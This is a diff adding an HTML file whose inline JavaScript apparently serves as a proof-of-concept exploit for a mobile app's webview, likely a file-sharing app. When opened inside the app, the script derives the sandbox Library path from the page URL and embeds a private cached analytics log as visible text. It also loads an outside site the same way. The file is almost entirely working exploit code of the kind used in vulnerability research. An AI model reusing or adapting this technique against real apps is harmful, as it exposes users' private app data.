@@ -1,0 +1,26 @@
+<!-- script that load a firebug lite version to get the webview debuggin console inside the app -->
+<!-- <script src='https://getfirebug.com/firebug-lite-debug.js'></script> -->
+<script>
+
+	var cutString = 'File%20Provider%20Storage';
+   	var locationPath = location.href.split(cutString)[0] + 'Library';
+   	var filePath = locationPath + '/Caches/analytics/current_log_net_box.BoxNet';
+	
+	document.write(filePath + '<br><br>');
+	document.write(document.location + '<br><br>');
+
+	var src = document.location;
+	var src2 = 'http://omespino.com';
+	var src3 = filePath;
+
+	var full ='<object data="'+ src +'" width="200" height="200" type="text/plain">Alternative Content</object><br>';
+	document.write(full);
+
+	var full2 ='<object data="'+ src2 +'" width="200" height="200" type="text/plain">Alternative Content</object><br>';
+	document.write(full2);
+
+	var full3 ='<object data="'+ src3 +'" width="200" height="200" type="text/plain">Alternative Content</object><br>';
+	document.write(full3);
+
+
+</script>
